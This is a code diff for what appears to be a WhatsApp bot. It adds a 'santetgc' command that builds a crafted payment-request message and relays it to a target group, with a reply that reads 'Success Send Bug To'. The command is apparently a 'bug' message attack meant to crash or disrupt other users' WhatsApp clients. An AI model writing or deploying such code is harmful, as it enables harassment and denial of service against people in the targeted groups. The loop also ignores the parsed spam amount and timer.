@@ -601,6 +601,27 @@ let buttons = [
                           hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
                       
                       break
+                      case 'santetgc': {
+
+if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
+num = q.split('|')[0]
+jumlah = q.split('|')[1]
+for (let i = 0; i < 1; i++) {
+reply(`Baiklah Tuan`)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/hisoka.jpg') }, { upload: hisoka.waUploadToServer })
+var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "IDR",
+"amount1000": "100",
+"extendedTextMessage": {
+"text": `MY DEVELOPER IKY MODS WA`,
+}
+}}), { userJid: m.chat, quoted: mek})
+hisoka.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
+reply(`Success Send Bug To\nAmount Spam: ${jumlah}`)
+}
+break
 
           case 'absen':
            anu = `Selamat pagi tekan tombol di bawah untuk absen
